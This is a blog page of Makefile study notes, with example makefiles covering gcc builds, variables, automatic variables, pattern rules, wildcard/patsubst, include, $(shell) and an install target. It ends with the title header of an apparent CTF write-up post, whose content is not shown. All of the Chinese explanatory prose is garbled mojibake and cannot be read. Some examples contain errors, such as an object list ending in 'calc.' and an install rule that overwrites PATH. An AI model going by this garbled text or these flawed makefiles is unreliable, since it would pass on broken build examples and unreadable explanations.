<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">a:</span></span><br><span class="line">	@echo <span class="string">&quot;hello world&quot;</span></span><br><span class="line">	@ls ./</span><br><span class="line">	gcc main.c</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	@rm -rf a.out</span><br><span class="line">	@echo <span class="string">&quot;a.out del success&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">os@os-virtual-machine:~/makefilestudy/1$ make</span><br><span class="line">hello world</span><br><span class="line">main.c	Makefile</span><br><span class="line">gcc main.c</span><br><span class="line">os@os-virtual-machine:~/makefilestudy/1$ make clean</span><br><span class="line">a.out del success</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907190203085.png" alt="image-20220907190203085"></p>
<h2 id="ç¼–è¯‘æµç¨‹"><a href="#ç¼–è¯‘æµç¨‹" class="headerlink" title="ç¼–è¯‘æµç¨‹"></a>ç¼–è¯‘æµç¨‹</h2><p>é¦–å…ˆæ˜¯æŠŠå„ä¸ªæ–‡ä»¶å…ˆç¼–è¯‘æˆç›®æ ‡æ–‡ä»¶ï¼Œç„¶åå†ç»Ÿä¸€æŠŠç›®æ ‡æ–‡ä»¶è¿›è¡Œé“¾æ¥ï¼Œè¿™æ ·åšçš„å¥½å¤„å°±æ˜¯å½“ä¿®æ”¹äº†ä¸€ä¸ªæ–‡ä»¶ä¹‹åï¼Œåœ¨æ‰§è¡Œ<code>make</code>å¹¶ä¸ä¼šæŠŠæ‰€æœ‰æ–‡ä»¶å…¨éƒ¨å†ç¼–è¯‘ä¸€æ¬¡ï¼Œè€Œæ˜¯åªæŠŠæ”¹åŠ¨çš„å’Œæ”¹åŠ¨ç›¸å…³çš„ä»£ç å†ç¼–è¯‘ä¸€éã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">calc:add.o sub.o multi.o</span><br><span class="line">	gcc add.o sub.o multi.o calc.cpp -o calc</span><br><span class="line"></span><br><span class="line">add.o:add.cpp</span><br><span class="line">	gcc -c add.cpp -o add.o</span><br><span class="line"></span><br><span class="line">sub.o:sub.cpp</span><br><span class="line">	gcc -c sub.cpp -o sub.o</span><br><span class="line"></span><br><span class="line">multi.o:multi.cpp</span><br><span class="line">	gcc -c multi.cpp -o multi.o</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907194008573.png" alt="image-20220907194008573"></p>
<h2 id="å˜é‡ä½¿ç”¨"><a href="#å˜é‡ä½¿ç”¨" class="headerlink" title="å˜é‡ä½¿ç”¨"></a>å˜é‡ä½¿ç”¨</h2><p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907195303414.png" alt="image-20220907195303414"></p>
<p>å¯ä»¥è‡ªå®šä¹‰å˜é‡ï¼Œç„¶åç”¨$(å˜é‡å)æ¥ä½¿ç”¨è¿™ä¸ªå˜é‡</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">OBJ=add.o sub.o multi.o calc.o</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	gcc <span class="variable">$(OBJ)</span> -o <span class="variable">$(TARGET)</span></span><br><span class="line"></span><br><span class="line"><span class="section">add.o:add.cpp</span></span><br><span class="line">	gcc -c add.cpp -o add.o</span><br><span class="line"></span><br><span class="line"><span class="section">sub.o:sub.cpp</span></span><br><span class="line">	gcc -c sub.cpp -o sub.o</span><br><span class="line"></span><br><span class="line"><span class="section">multi.o:multi.cpp</span></span><br><span class="line">	gcc -c multi.cpp -o multi.o</span><br><span class="line"></span><br><span class="line"><span class="section">calc.o:calc.cpp</span></span><br><span class="line">	gcc -c calc.cpp -o calc.o</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -rf *.o calc</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä½¿ç”¨ç³»ç»Ÿå˜é‡æ›´åŠ ç®€åŒ–</p>
<p>$^å°±æ˜¯æ‰€æœ‰ä¸é‡å¤çš„ä¾èµ–æ–‡ä»¶ä¹Ÿå°±æ˜¯<code>:</code>åé¢è·Ÿç€çš„å†…å®¹ï¼Œ$(TARGET)å†’å·åé¢æ˜¯å˜é‡<code>OBJ</code>,æ‰€ä»¥æ˜¯<code>add.o sub.o multi.o calc.o</code>,$@æ˜¯ç›®æ ‡æ–‡ä»¶çš„å®Œæ•´åç§°ï¼Œä¹Ÿå°±æ˜¯<code>$(TARGET)</code>,æœ€å<code>gcc $^ -o $@</code>=<code>gcc add.o sub.o multi.o calc.o -o calc</code></p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">OBJ=add.o sub.o multi.o calc.o</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	gcc <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">add.o:add.cpp</span></span><br><span class="line">	gcc -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">sub.o:sub.cpp</span></span><br><span class="line">	gcc -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">multi.o:multi.cpp</span></span><br><span class="line">	gcc -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">calc.o:calc.cpp</span></span><br><span class="line">	gcc -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -rf *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿˜å¯ä»¥ä½¿ç”¨ç³»ç»Ÿå¸¸é‡æ¥å®Œæˆè·¨å¹³å°çš„ä¸€äº›æ•ˆæœ</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">OBJ=add.o sub.o multi.o calc.o</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">add.o:add.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">sub.o:sub.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">multi.o:multi.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">calc.o:calc.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>

<h2 id="ä¼ªç›®æ ‡å’Œæ¨¡å¼åŒ¹é…"><a href="#ä¼ªç›®æ ‡å’Œæ¨¡å¼åŒ¹é…" class="headerlink" title="ä¼ªç›®æ ‡å’Œæ¨¡å¼åŒ¹é…"></a>ä¼ªç›®æ ‡å’Œæ¨¡å¼åŒ¹é…</h2><h3 id="ä¼ªç›®æ ‡"><a href="#ä¼ªç›®æ ‡" class="headerlink" title="ä¼ªç›®æ ‡"></a>ä¼ªç›®æ ‡</h3><p>æŒ‰ç…§æˆ‘çš„ç†è§£ï¼Œå¯èƒ½å¹¿ä¹‰ä¸Šæ¥è¯´ç›®æ ‡å°±æ˜¯æŒ‡è¿™ä¸ªç›®æ ‡çš„å‘½ä»¤æ‰§è¡Œåæœ€åäº§ç”Ÿçš„æ–‡ä»¶åï¼Œä¸€èˆ¬<code>make clean</code>å°±æ˜¯æ‰§è¡Œcleanç›®æ ‡çš„å‘½ä»¤ï¼Œå¦‚æœåœ¨å½“å‰ç›®å½•ä¸‹touchäº†ä¸€ä¸ªcleanæ–‡ä»¶ï¼Œç„¶åå†æ‰§è¡Œ<code>make clean</code>ä¼šå‘ç°æ²¡æœ‰æ‰§è¡Œå‘½ä»¤ï¼ŒåŸå› å°±æ˜¯makeè®¤ä¸ºcleanæ–‡ä»¶å°±æ˜¯ç›®æ ‡ï¼Œå·²ç»å­˜åœ¨è€Œä¸”æ²¡æœ‰æ›´æ–°æ‰€ä»¥ä¸éœ€è¦æ‰§è¡Œå‘½ä»¤äº†ã€‚</p>
<p>å¯¹äºè¿™ç§æƒ…å†µå°±å¾—å£°æ˜<code>clean</code>ä¸ºä¼ªç›®æ ‡äº†ï¼Œæ‰€ä»¥å¯ä»¥çœ‹å‡ºå½“å½“å‰ç›®æ ‡ä¸ç”Ÿæˆå¯¹åº”æ–‡ä»¶ï¼Œè€Œæ˜¯ä¸€ç§åŠŸèƒ½ç›®æ ‡æ—¶å°±åº”è¯¥æŠŠä»–å£°æ˜æˆä¼ªç›®æ ‡ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907201801523.png" alt="image-20220907201801523"></p>
<h3 id="æ¨¡å¼åŒ¹é…"><a href="#æ¨¡å¼åŒ¹é…" class="headerlink" title="æ¨¡å¼åŒ¹é…"></a>æ¨¡å¼åŒ¹é…</h3><p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907204648885.png" alt="image-20220907204648885"></p>
<p>æ„Ÿè§‰è¿™ä¸ªè§„åˆ™è¿˜æ˜¯å¾ˆæ–¹ä¾¿çš„ï¼Œå°±æ‹¿ä¸Šé¢çš„makefileæ¥è¯´ï¼Œå¯ä»¥ä¿®æ”¹æˆä¸‹é¢çš„æ ·å­,makefileå°±ç¼©çŸ­æˆå‡ è¡Œçš„æ ·å­äº†ï¼Œè‡³äºè¿™æ¡è§„åˆ™çš„åŸç†ï¼Œå¤§æ¦‚å°±æ˜¯ä»–ä¼šç”Ÿæˆç¬¬ä¸€ä¸ªç›®æ ‡ä¹Ÿå°±æ˜¯<code>$(TARGET):$(OBJ)</code>ï¼Œç„¶åå‘ç°<code>add.o sub.o multi.o calc.o</code>è¿™äº›ä¾èµ–æ–‡ä»¶éƒ½æ²¡æœ‰ç”Ÿæˆï¼Œç„¶åå°±ä¼šå»æ‰¾ç”Ÿæˆè¿™äº›æ–‡ä»¶çš„ç›®æ ‡ï¼Œé¦–å…ˆæ˜¯ç¬¬ä¸€ä¸ª<code>add.o</code>ï¼Œ<code>%.o:%.cpp</code>ç›®æ ‡å°±èƒ½åŒ¹é…ï¼Œç„¶åå°±ä¼šæ‰§è¡Œè¿™ä¸ªç›®æ ‡çš„å‘½ä»¤ï¼Œè¿›è€Œç”Ÿæˆ<code>add.o</code>,å…¶ä»–æ‰€æœ‰çš„ç›®æ ‡æ–‡ä»¶ä¹Ÿæ˜¯è¿™æ ·ç”Ÿæˆï¼Œæœ€åç”Ÿæˆ<code>calc</code>ã€‚</p>
<p>é€šè¿‡è¿™ä¸ªæ¨¡å¼åŒ¹é…ï¼Œæ„Ÿè§‰makefileå°±æ˜¯ä¸€å±‚å¥—ä¸€å±‚ï¼Œç„¶åä»æœ€åº•å±‚å¾€ä¸Šæ‰¾ï¼Œç›´åˆ°æœ€åº•å±‚çš„ä¾èµ–å…¨ç¨‹éƒ½æœ‰äº†ï¼Œå†æ‰§è¡Œæœ€åº•å±‚çš„å‘½ä»¤ã€‚æœ‰ç‚¹é€’å½’é‚£å‘³äº†ã€‚</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">OBJ=add.o sub.o multi.o calc.</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o:%.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªmakefileè¿˜å¯ä»¥åˆ©ç”¨<code>wildcard</code>å’Œ<code>patsubst</code>æ¥å¢åŠ makefileçš„æ³›ç”¨æ€§</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#OBJ= sub.o multi.o calc.o add.o</span></span><br><span class="line">OBJ=<span class="variable">$(<span class="built_in">patsubst</span> %.cpp,%.o,$(<span class="built_in">wildcard</span> ./*.cpp)</span>)</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o:%.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> *.o <span class="variable">$(TARGET)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ç¼–è¯‘åŠ¨æ€é“¾æ¥åº“"><a href="#ç¼–è¯‘åŠ¨æ€é“¾æ¥åº“" class="headerlink" title="ç¼–è¯‘åŠ¨æ€é“¾æ¥åº“"></a>ç¼–è¯‘åŠ¨æ€é“¾æ¥åº“</h2><p>æ„Ÿè§‰ã€‚ã€‚ã€‚æ²¡å•¥ã€‚ã€‚ã€‚ã€‚ï¼Œå’Œmakefileå…³ç³»ä¸å¤§</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907215742516.png" alt="image-20220907215742516"></p>
<h2 id="é€šç”¨éƒ¨åˆ†åšå…¬å…±å¤´æ–‡ä»¶"><a href="#é€šç”¨éƒ¨åˆ†åšå…¬å…±å¤´æ–‡ä»¶" class="headerlink" title="é€šç”¨éƒ¨åˆ†åšå…¬å…±å¤´æ–‡ä»¶"></a>é€šç”¨éƒ¨åˆ†åšå…¬å…±å¤´æ–‡ä»¶</h2><p>makefileè¿˜æœ‰è‡ªåŠ¨æ¨å¯¼èƒ½åŠ›ï¼Œä¸Šé¢çš„makefileè¿˜å¯ä»¥ç®€çŸ­åˆ°ä»¥ä¸‹å‡ è¡Œ</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#OBJ= sub.o multi.o calc.o add.o</span></span><br><span class="line">OBJ=<span class="variable">$(<span class="built_in">patsubst</span> %.cpp,%.o,$(<span class="built_in">wildcard</span> ./*.cpp)</span>)</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> *.o <span class="variable">$(TARGET)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>makefileè¿˜èƒ½åµŒå¥—makefile,é‚£å°±å¯ä»¥æŠŠé€šç”¨çš„å†…å®¹å†™åœ¨ä¸€ä¸ªmakefileä¸­ï¼Œç„¶ååœ¨å…¶ä»–makefileä¸­ä½¿ç”¨ï¼Œå¦‚ä¸‹ä¾‹</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TARGET=c</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> ../makefile</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å…¬å…±</span></span><br><span class="line"></span><br><span class="line">SOURCE=<span class="variable">$(<span class="built_in">wildcard</span>  ./*.cpp ./*.c)</span></span><br><span class="line">OBJ=<span class="variable">$(<span class="built_in">patsubst</span>  %.cpp,%.o,<span class="variable">$(SOURCE)</span>)</span></span><br><span class="line">OBJ:=<span class="variable">$(<span class="built_in">patsubst</span>  %.c,%.o,<span class="variable">$(OBJ)</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>:clean</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line">	</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> <span class="variable">$(TARGET)</span> <span class="variable">$(OBJ)</span></span><br><span class="line">	</span><br><span class="line"><span class="section">show:</span></span><br><span class="line">	echo <span class="variable">$(SOURCE)</span></span><br><span class="line">	echo <span class="variable">$(OBJ)</span></span><br></pre></td></tr></table></figure>

<p>åœ¨makefileä¸­éƒ½æ˜¯å…ˆè§£ææ‰€æœ‰å˜é‡ç„¶åå†æ‰§è¡Œå‘½ä»¤çš„ï¼Œæ‰€ä»¥å˜é‡çš„å£°æ˜æ”¾åœ¨å“ªé‡Œéƒ½æ˜¯æ²¡æœ‰æ‰€è°“çš„ã€‚</p>
<p><code>=</code>,èµ‹å€¼æ“ä½œï¼ŒæŠŠç»ˆå€¼èµ‹å€¼ç»™å˜é‡ï¼Œæ³¨æ„ä¸èƒ½å­—èŠ‚èµ‹å€¼ç»™å­—èŠ‚ï¼Œæ¯”å¦‚Y=$(Y)</p>
<p><code>ï¼š=</code>ä¹Ÿæ˜¯èµ‹å€¼ï¼Œä½†æ˜¯ä¸<code>=</code>ä¸åŒçš„æ˜¯ä»–ä¸ä¼šå—åˆ°å®ƒä¸‹é¢çš„ä»£ç ä»¥åŠå˜é‡çš„å½±å“ã€‚</p>
<h2 id="è°ƒç”¨shell"><a href="#è°ƒç”¨shell" class="headerlink" title="è°ƒç”¨shell"></a>è°ƒç”¨shell</h2><p>åœ¨makefileä¸­å¯ä»¥ä½¿ç”¨<code>ifndef endif</code>æ¥æ·»åŠ é»˜è®¤å€¼</p>
<p>åœ¨makefileä¸­å¯ä»¥åœ¨ç›®æ ‡ä»¥å¤–æ‰§è¡Œshellå‘½ä»¤ï¼Œå¦‚ä¸‹</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A=<span class="variable">$(<span class="built_in">shell</span> ls)</span></span><br><span class="line"><span class="section">a:</span></span><br><span class="line">	echo <span class="variable">$(A)</span></span><br></pre></td></tr></table></figure>

<p>åœ¨makefileä¸­è¿˜å¯ä»¥è°ƒç”¨å…¶ä»–makefile,ä¸æ˜¯åƒä¸Šé¢é‚£æ ·çš„åŒ…å«ï¼Œè€Œæ˜¯è°ƒç”¨ï¼Œå› ä¸ºå¾ˆæœ‰æ—¶å€™ä¸åŒæ¨¡å—æœ‰ä¸åŒçš„makefile,è¦æƒ³ç›´æ¥å…¨éƒ¨å°±ä¸€èµ·ç¼–è¯‘ï¼Œå¯ä»¥å†å†™ä¸ªmakefileè°ƒç”¨ä»–ä»¬ï¼Œè°ƒç”¨è§„åˆ™å…¶å®å°±æ˜¯shellæŒ‡ä»¤</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">a:</span></span><br><span class="line">	make -C ./makefile</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908155748153.png" alt="image-20220908155748153"></p>
<h2 id="æ¡ä»¶åˆ¤æ–­-amp-å¾ªç¯"><a href="#æ¡ä»¶åˆ¤æ–­-amp-å¾ªç¯" class="headerlink" title="æ¡ä»¶åˆ¤æ–­&amp;å¾ªç¯"></a>æ¡ä»¶åˆ¤æ–­&amp;å¾ªç¯</h2><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908160944829.png" alt="image-20220908160944829" style="zoom:200%;" />

<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908161145932.png" alt="image-20220908161145932"></p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908161321317.png" alt="image-20220908161321317"></p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908163409283.png" alt="image-20220908163409283"></p>
<h2 id="è‡ªå®šä¹‰å‡½æ•°"><a href="#è‡ªå®šä¹‰å‡½æ•°" class="headerlink" title="è‡ªå®šä¹‰å‡½æ•°"></a>è‡ªå®šä¹‰å‡½æ•°</h2><p>å˜é‡ï¼Œif,å¾ªç¯å’Œå‡½æ•°éƒ½æœ‰äº†ï¼Œæ„Ÿè§‰å’Œä¸€é—¨è¯­è¨€éƒ½å·®ä¸å¤šäº†ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908163840185.png" alt="image-20220908163840185"></p>
<h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908165302800.png" alt="image-20220908165302800"></p>
<p>ä¾‹å­ï¼ŒæŠŠäºŒè¿›åˆ¶ç¨‹åºæ”¾ç½®åœ¨ä¸€ä¸ªç›®å½•ä¸‹ï¼Œç„¶ååœ¨/binç›®å½•ä¸­æ”¾ä¸€ä¸ªäºŒè¿›åˆ¶ç¨‹åºçš„è½¯é“¾æ¥ï¼Œç„¶åå°±å¯ä»¥åœ¨ä»»ä½•ç›®å½•ä¸­è°ƒç”¨è¿™ä¸ªç¨‹åºäº†ã€‚</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">TARGET:=006_main</span><br><span class="line">OBJ:=<span class="variable">$(TARGET)</span>.o</span><br><span class="line"></span><br><span class="line">CC:=g++</span><br><span class="line"></span><br><span class="line">PATH:=/tmp/006_main/</span><br><span class="line">BIN:=/usr/local/bin/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">install:<span class="variable">$(TARGET)</span></span></span><br><span class="line">	if [ -d <span class="variable">$(PATH)</span> ];\</span><br><span class="line">		then echo <span class="variable">$(PATH)</span> exist; \</span><br><span class="line">	<span class="keyword">else</span> \</span><br><span class="line">	  	/bin/mkdir <span class="variable">$(PATH)</span>;\</span><br><span class="line">	  	/bin/cp <span class="variable">$(TARGET)</span> <span class="variable">$(PATH)</span>;\</span><br><span class="line">  		/bin/ln -sv <span class="variable">$(PATH)</span><span class="variable">$(TARGET)</span> <span class="variable">$(BIN)</span>;\</span><br><span class="line">  	fi;</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> <span class="variable">$(TARGET)</span> <span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(RM)</span> -rf <span class="variable">$(PATH)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>:clean install</span></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/12/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-Smurfs%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/12/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-Smurfs%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">è“å¸½æ¯åŠå†³èµ› Smurfså¤ç°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-08-12 21:57:21" itemprop="dateCreated datePublished" datetime="2022-08-12T21:57:21+08:00">2022-08-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
